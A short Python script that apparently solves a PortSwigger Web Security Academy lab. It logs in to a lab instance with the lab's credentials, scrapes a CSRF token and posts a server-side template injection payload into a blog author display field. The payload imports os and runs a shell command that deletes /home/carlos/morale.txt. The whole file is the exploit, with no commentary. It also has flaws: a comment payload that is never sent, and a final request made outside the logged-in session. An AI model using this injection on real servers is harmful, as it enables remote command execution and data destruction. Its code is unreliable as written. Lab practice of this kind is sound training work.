#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0af00009045aa901808a719f00560061.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data_login = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter',
}

response = session.post(
    url + '/login',
    data=data_login,
    verify=False,
    allow_redirects=False,
)

# session_data = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

data_comment = {
    'postId' : '5',
    'comment' :  '123%0D%0A',
}
response = session.post(
    url + '/post/comment',
    verify=False,
    allow_redirects=False,
)

response = session.get(
    url + '/post?postId=5',
    verify=False,
    allow_redirects=False,
)

response = session.get(
    url + '/my-account?id=wiener',
    verify=False,
    allow_redirects=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf' : csrf,
    'blog-post-author-display' : "user.name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')"
}

response = requests.post(
    url + '/my-account/change-blog-post-author-display',
    data= data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)